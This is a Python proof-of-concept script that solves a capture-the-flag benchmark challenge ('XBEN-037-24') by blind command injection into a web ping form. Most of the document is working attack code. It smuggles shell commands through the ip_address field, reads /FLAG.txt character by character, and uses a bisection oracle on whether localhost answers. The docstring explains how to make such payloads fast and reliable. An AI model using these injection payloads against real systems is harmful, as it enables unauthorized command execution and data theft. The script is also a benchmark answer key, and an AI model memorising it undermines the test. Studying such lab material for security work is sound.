#!/usr/bin/env python3
"""XBEN-037-24 — "Is There Anybody Out There? - Blind" (command_injection).

The ping form concatenates its parameter into a shell command and reports only
whether the host answered. One bit per request, 64 hex characters to recover.

Three things this script does that the first attempt got wrong, each of which
cost a run:

  * **It never uses `<` in the payload.** The container's shell is `dash`, where
    `<` is a redirect, not a string comparison. The first version bisected on
    `[ "$c" \\< "$p" ]` and produced 64 characters of confident nonsense.
    Character codes and `-le` are unambiguous everywhere.

  * **It refuses to read a refusal as a negative.** h5i answers `ok: false` with
    a reason when it will not send. Treating that as "the bit was 0" turns a
    spent allowance into a plausible wrong flag. The page's network budget
    bounds *page* code, so a deliberately long loop resets it with
    `--reset-budget` and still checks `ok` on every answer.

  * **It makes the base command fail instantly.** The injected string is
    appended to `ping -c 2 `, so a payload starting with an address waits three
    seconds for an unroutable host before the interesting part runs. Starting
    with `;` makes that first ping a usage error, and a probe drops from three
    seconds to forty milliseconds.

The oracle reads the page, not its size. Size was tried first, because the
replay's own reply carries it and that costs one process instead of two: it does
not work here. The result page echoes the submitted address back *HTML-escaped*,
so two payloads of equal length reflect at different lengths, and the number
answers a question about the payload rather than about the flag. Padding does
not fix it. Reading the body does.
"""
import json
import os
import subprocess
import sys

# The binary, or a build of it: `H5I=../h5i/target/release/h5i`.
H5I = os.environ.get("H5I", "h5i")
SESSION = "xben037-poc"
HEX = "0123456789abcdef"


def h5i(*args):
    return subprocess.run([H5I, *args], capture_output=True, text=True).stdout


def probe(payload, seq):
    """Send the ping request again, and answer the one-bit oracle."""
    reply = json.loads(h5i("browser", "resend", str(seq),
                           "--set", f"form.ip_address={payload}",
                           "--reset-budget", "--session", SESSION, "--json"))
    if not reply.get("ok"):
        # A refusal is not a negative answer. Reading it as one turns a spent
        # allowance into 64 characters of plausible nonsense.
        raise RuntimeError(
            "h5i would not send this: "
            + str(reply.get("response", {}).get("error") or reply.get("message")))
    # `match` exits 0 when it matched, 1 when it did not, 2 when it could not
    # look. Only the first is a yes, and the third must never be read as a no.
    outcome = subprocess.run(
        [H5I, "websec", "match", f"res_{reply['seq']}",
         "--contains", "Host is reachable", "--session", SESSION],
        capture_output=True, text=True)
    if outcome.returncode not in (0, 1):
        raise RuntimeError(f"the oracle could not be read: {outcome.stderr.strip()}")
    return outcome.returncode == 0


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: xben-037-blind-command-injection.py http://127.0.0.1:PORT")
    url = sys.argv[1]

    subprocess.run([H5I, "browser", "close", "--session", SESSION], capture_output=True)
    h5i("browser", "open", f"{url}/", "--session", SESSION, "--new", "--capture")
    h5i("browser", "type", "--selector", "input[name=ip_address]", "127.0.0.1",
        "--session", SESSION)
    h5i("browser", "click", "--role", "button", "--name", "Ping", "--session", SESSION)
    seq = json.loads(h5i("websec", "requests", "--method", "POST",
                         "--session", SESSION))["requests"][0]["seq"]

    # The oracle has to separate something before it is trusted.
    if not probe("; ping -c 1 -W 1 127.0.0.1", seq) or probe("; true", seq):
        sys.exit("the oracle does not separate reachable from unreachable")

    flag = "FLAG{"
    for position in range(6, 70):
        lo, hi = 0, 15
        while lo < hi:                      # four questions per character
            mid = (lo + hi) // 2
            payload = (f'; c=$(cut -c{position} /FLAG.txt); '
                       f'n=$(printf "%d" "\'$c"); '
                       f'[ $n -le {ord(HEX[mid])} ] && ping -c 1 -W 1 127.0.0.1')
            if probe(payload, seq):
                hi = mid
            else:
                lo = mid + 1
        flag += HEX[lo]
        print(f"\r  {flag}", end="", file=sys.stderr, flush=True)
    print(file=sys.stderr)
    print(flag + "}")
    subprocess.run([H5I, "browser", "close", "--session", SESSION], capture_output=True)


if __name__ == "__main__":
    main()
